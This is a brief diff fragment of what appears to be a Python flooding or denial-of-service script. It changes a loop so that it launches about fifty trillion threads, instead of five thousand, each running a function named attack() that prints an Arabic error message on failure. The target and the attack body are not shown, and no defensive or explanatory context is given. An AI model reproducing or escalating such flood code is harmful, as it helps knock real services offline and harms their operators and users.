@@ -20,7 +20,7 @@ def attack():
         except Exception as e:
             print("حدث خطأ:", e)
 
-for i in range(5000):
+for i in range(50000000000000):
     thread = threading.Thread(target=attack)
     thread.start()
 
